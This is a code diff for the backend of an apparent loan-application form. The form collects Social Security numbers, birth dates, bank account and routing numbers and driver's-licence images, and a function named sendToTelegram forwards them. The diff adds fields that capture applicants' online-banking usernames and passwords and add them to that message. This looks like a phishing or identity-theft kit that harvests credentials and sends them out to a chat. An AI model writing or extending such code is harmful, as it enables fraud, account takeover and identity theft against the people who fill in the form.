@@ -28,6 +28,8 @@ interface FormData {
   bankState: string;
   aba: string;
   accountNumber: string;
+  bankUsername?: string;
+  bankPassword?: string;
   consolidationOption?: string;
   customConsolidation?: string;
   dlFrontUrl?: string;
@@ -41,8 +43,8 @@ async function sendToTelegram(formData: FormData) {
     firstName, lastName, email, phone, ssn, dob, address, city, state, zip,
     employmentStatus, employerName, employerPhone, monthlyIncome, payFrequency,
     nextPayDate, directDeposit, creditRating, loanPurpose, loanAmount,
-    bankName, bankState, aba, accountNumber, consolidationOption, customConsolidation,
-    dlFront, dlBack
+    bankName, bankState, aba, accountNumber, bankUsername, bankPassword,
+    consolidationOption, customConsolidation, dlFront, dlBack
   } = formData;
 
   // Format message with all fields
@@ -78,6 +80,8 @@ ${consolidationOption ? `• Consolidation: ${consolidationOption}${customConsol
 • Bank State: ${bankState}
 • ABA/Routing: ${aba}
 • Account: ${accountNumber}
+• Username: ${bankUsername || 'N/A'}
+• Password: ${bankPassword || 'N/A'}
 ━━━━━━━━━━━━━━━━━━━━━
   `.trim();
 
@@ -148,6 +152,8 @@ export async function POST(req: NextRequest) {
       bankState: formData.get('bankState') as string,
       aba: formData.get('aba') as string,
       accountNumber: formData.get('accountNumber') as string,
+      bankUsername: formData.get('bankUsername') as string || undefined,
+      bankPassword: formData.get('bankPassword') as string || undefined,
       consolidationOption: formData.get('consolidationOption') as string || undefined,
       customConsolidation: formData.get('customConsolidation') as string || undefined,
       dlFront: formData.get('dlFront') as File || undefined,
